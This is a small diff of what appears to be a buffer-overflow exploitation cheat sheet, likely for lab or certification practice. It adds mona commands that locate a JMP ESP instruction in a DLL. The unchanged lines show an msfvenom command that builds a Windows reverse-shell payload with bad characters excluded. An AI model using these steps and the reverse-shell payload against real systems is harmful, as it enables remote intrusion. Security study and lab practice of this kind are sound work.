@@ -16,5 +16,9 @@
 #find JMP
 !mona jmp -r esp -cpb "BADCHARS"
 
+!mona modules
+!mona find -s "\xff\xe4" -m "some.dll"
+
+
 #gen payload
 msfvenom -p windows/shell_reverse_tcp LHOST= LPORT= EXITFUNC=thread -f py -a x86 -b "BADCHARS"
